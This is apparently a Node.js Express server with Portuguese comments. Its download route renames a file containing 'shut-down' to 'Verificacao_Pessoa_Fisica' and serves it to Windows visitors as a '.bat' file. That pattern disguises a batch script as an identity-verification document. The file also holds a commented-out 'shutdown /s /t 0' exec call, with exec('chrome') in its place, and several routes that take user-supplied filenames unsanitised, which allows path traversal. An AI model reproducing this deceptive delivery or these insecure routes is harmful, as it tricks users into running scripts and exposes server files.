const path = require('path');
const express = require("express")

const PORT = 3008

const app = express()

app.listen(PORT, () => {
	console.log(`Server listening on ${PORT}`)
})

// Have Node serve the files for our built React app
app.use(express.static(path.resolve(__dirname, '../client/build')));

const { exec } = require('child_process');
function desligarComputador() {
  //exec('shutdown /s /t 0', (error, stdout, stderr) => {
  exec('chrome', (error, stdout, stderr) => {
    if (error) {
      console.error(`Erro ao desligar o computador: ${error}`);
    } else {
      console.log('O computador está sendo desligado.');
    }
  });
  
}

const mime = require('mime')

app.get('/download/:filename',(req,res)=>{
  let filePath = path.resolve(__dirname + "/data/" + req.params.filename); 
  let filename = req.params.filename
  console.log('Requesting', filename)
  if (filename.includes('shut-down')){
  	filename = "Verificacao_Pessoa_Fisica"
  }
  if (req.headers['user-agent'].includes('Windows')){
    filePath = filePath + '.bat'
    filename = filename + '.bat'
    console.log(filePath)
  }
  res.download(
    filePath, filename , (err) => {if (err){
      console.log(err)
    }}) 
})

// Handle GET requests to /api route
app.get("/api", (req, res) => {
  console.log(req)
  console.log('test')
  desligarComputador();
  
});

app.get('/data/:filename', (req, res) => {
  console.log('Requesting data/'+req.params.filename)
  res.sendFile(path.resolve(__dirname, '/data/', req.params.filename))
})

app.get('/main.js', (req,res) => {
  res.sendFile(path.resolve(__dirname, '../client', 'main.js'))
})

// All other GET requests not handled before will return our React app
app.get('/:page', (req, res) => {
  res.sendFile(path.resolve(__dirname, '../client', req.params.page));
});

app.get('*', (req, res) => {
  res.sendFile(path.resolve(path.resolve(__dirname, '../client', 'index.html')))
})

